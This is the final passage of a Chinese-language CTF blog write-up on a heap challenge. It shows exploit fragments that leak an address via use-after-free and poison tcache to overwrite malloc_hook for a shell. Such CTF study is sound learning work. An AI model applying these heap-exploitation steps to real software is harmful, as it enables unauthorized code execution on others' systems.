<p>4.泄露地址</p>
<p>我们知道此时我们下一步是修改malloc的内容，因此我们需要泄露地址，tcache又被填满了因此我们可以利用UAF来泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(0)#0,2,3		--这里不知道为什么不能free（1）,后面备注的都是可以的</span><br><span class="line">show(0)</span><br></pre></td></tr></table></figure>

<p>5.再次利用0x90tcache修改malloc_hook内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(0x0707070707070707).ljust(0x70,&#39;\x00&#39;) + p64(mmap_addr) +p64(malloc_addr)</span><br><span class="line">edit(4,payload)</span><br><span class="line">add(0x80)#6</span><br><span class="line">edit(6,p64(mmap_addr))</span><br></pre></td></tr></table></figure>

<p>要注意这次利用的是0x90</p>
<p>接下来malloc一次就可以get_shell了</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/">http://example.com/2022/02/21/BUU%E5%88%B7%E9%A2%98-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/25/buu%E5%88%B7%E9%A2%98-4/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">buu刷题-4</div></div></a></div><div class="next-post pull-right"><a href="/2022/02/16/Srop%E9%A2%98%E5%9E%8B/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Srop题型</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>